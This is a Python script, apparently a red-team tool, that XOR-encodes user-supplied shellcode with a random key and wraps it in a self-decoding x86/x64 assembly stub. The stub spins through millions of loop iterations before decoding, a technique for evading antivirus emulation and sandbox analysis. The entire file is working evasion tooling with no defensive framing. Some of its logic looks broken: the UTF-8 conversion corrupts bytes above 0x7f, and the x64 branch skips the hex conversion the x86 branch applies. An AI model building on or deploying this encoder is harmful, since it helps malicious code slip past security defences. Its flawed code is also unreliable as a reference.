#!/usr/bin/env python3
# Author: M Bergeron
#	Feat: Mr.Un1k0d3r RingZer0 Team

import sys
import struct
import random
import base64
import binascii
import argparse

def toHex(string):
	if(type(string) == bytes):
		return "".join("\\x{:02x}".format(x) for x in string)
	else:
		return "".join("\\x{:02x}".format(ord(x)) for x in string)
		
def encodeShellcode(shellcodeRaw, key):	
	padding = 4 - (len(shellcodeRaw) % 4) if len(shellcodeRaw) % 4 != 0 else 0
	
	shellcodeEncoded = b""
	shellcodeRaw += b"\x90" * padding
	
	for b in shellcodeRaw:
		shellcodeEncoded += chr(b ^ key).encode()

	shellcodeEncoded = shellcodeEncoded.decode('utf-8')

	return shellcodeEncoded
	
def generateASM(shellcodeEncoded, key, architecture):
	MIN_NUMBER_OF_LOOP = 10000000
	minimum = int(MIN_NUMBER_OF_LOOP / int(len(shellcodeEncoded) / 4))
	minimum = minimum if minimum >= 999 else 999
	minimum = minimum if minimum % 2 == 1 else minimum+1

	numberOfLoop = random.randrange(minimum, minimum + 1000, 2)

	if(architecture == "x86"):
		asm = "\\xeb\\x26\\x58\\xbb\\x04\\x00\\x00\\x00\\xb9{loop1}\\xba{loop2}\\x80\\x34\\x88{xorKey}\\x4a\\x85\\xd2\\x7f\\xf7\\xe2\\xf0\\x80\\x30{xorKey}\\x40\\x4b\\x85\\xdb\\x75\\xe2\\xeb\\x05\\xe8\\xd5\\xff\\xff\\xff{shellcode}".format(loop1=toHex(struct.pack("<I", int(len(shellcodeEncoded)/4))), loop2=toHex(struct.pack("<I", numberOfLoop)), xorKey=toHex(chr(key)), shellcode=toHex(shellcodeEncoded))
	else:
		asm = "\\xeb\\x2e\\x58\\xbb\\x04\\x00\\x00\\x00\\xb9{loop1}\\xba{loop2}\\x80\\x34\\x88{xorKey}\\x48\\xff\\xca\\x48\\x85\\xd2\\x7f\\xf4\\xe2\\xed\\x80\\x30{xorKey}\\x48\\xff\\xc0\\x48\\xff\\xcb\\x48\\x85\\xdb\\x75\\xda\\xeb\\x05\\xe8\\xcd\\xff\\xff\\xff{shellcode}".format(loop1=struct.pack("<I", int(len(shellcodeEncoded)/4)), loop2=struct.pack("<I", numberOfLoop), xorKey=chr(key), shellcode=shellcodeEncoded)

	return base64.b64encode(asm.encode('utf-8')).decode('utf-8')

if __name__ == '__main__':

	parser = argparse.ArgumentParser()
	parser.add_argument("-s", "--shellcode", dest="shellcode", help="base64 encoded shellcode.", type=str, required=True)
	parser.add_argument("-a", "--arch", dest="arch", help="Architecture x86 or x64.", choices=("x86", "x64"), type=str, required=True)
	args = parser.parse_args()

	shellcodeRaw = base64.b64decode(args.shellcode)
	key = random.randrange(0x01, 0xfe)
	architecture = args.arch

	shellcodeEncoded = encodeShellcode(shellcodeRaw, key)
	print(generateASM(shellcodeEncoded, key, architecture))
